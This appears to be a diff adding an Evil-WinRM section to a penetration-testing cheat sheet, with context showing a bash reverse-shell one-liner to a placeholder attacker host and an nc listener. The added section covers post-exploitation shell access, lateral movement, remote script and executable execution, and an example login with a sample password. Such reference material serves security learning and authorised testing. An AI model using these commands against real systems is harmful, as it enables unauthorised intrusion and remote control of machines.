@@ -12,6 +12,8 @@
     - [Web/HTTP](#webhttp)
 - [Reverse Shells](#reverse-shells)
   - [Bash Reverse Shell](#bash-reverse-shell)
+- [Remote Access](#remote-access)
+  - [Windows Remote Management (WinRM)](#windows-remote-management-winrm)
 - [Privilege Escalation](#privilege-escalation)
   - [Linux](#linux)
     - [SUID Files](#suid-files)
@@ -403,6 +405,42 @@ bash -i >& /dev/tcp/{ATTACKER-IP}/{PORT} 0>&1
 * **On attacker machine**, set up a listener first: `nc -lvnp <PORT>` or `rlwrap nc -lvnp <PORT>` (for better shell interaction)
 * Example: `bash -i >& /dev/tcp/10.10.10.5/4444 0>&1`
 * Works on systems with bash and `/dev/tcp` support (most Linux systems)
+
+---
+
+## Remote Access
+
+### Windows Remote Management (WinRM)
+
+* **WinRM Connection with Evil-WinRM** - Connects to Windows Remote Management service for interactive shell access
+
+```bash
+evil-winrm -i <target> -u <username> -p '<password>'
+```
+
+* `evil-winrm`: Ruby-based tool for connecting to Windows Remote Management (WinRM) service
+* `-i <target>`: Target IP address or hostname
+* `-u <username>`: Username for authentication
+* `-p '<password>'`: Password for authentication
+* **WinRM (Windows Remote Management)**: Microsoft protocol for remote management of Windows systems
+* Provides interactive PowerShell-like shell on Windows targets
+* **Common ports**: 5985 (HTTP) and 5986 (HTTPS)
+* **Use cases**:
+  * Post-exploitation: After obtaining Windows credentials, use WinRM for persistent access
+  * Lateral movement: Access other Windows systems in the network
+  * Interactive shell: Better than reverse shells for Windows (PowerShell environment, file upload/download)
+* **Common options**:
+  * `-S`: Use SSL/TLS (HTTPS) - connects to port 5986
+  * `-P <port>`: Specify custom port (default: 5985 for HTTP, 5986 for HTTPS)
+  * `-s <script_path>`: Execute a PowerShell script on the target
+  * `-e <exe_path>`: Upload and execute an executable
+  * `-d <directory>`: Set base directory for file uploads/downloads
+* **File operations** (once connected):
+  * `upload <local_file>`: Upload file to target
+  * `download <remote_file>`: Download file from target
+  * `cd`, `ls`, `pwd`: Navigate filesystem
+  * `Invoke-Binary`: Execute uploaded binaries
+* Example: `evil-winrm -i 10.10.161.74 -u SUSANNA_MCKNIGHT -p 'CHANGEME2023!'`
 
 ---
 
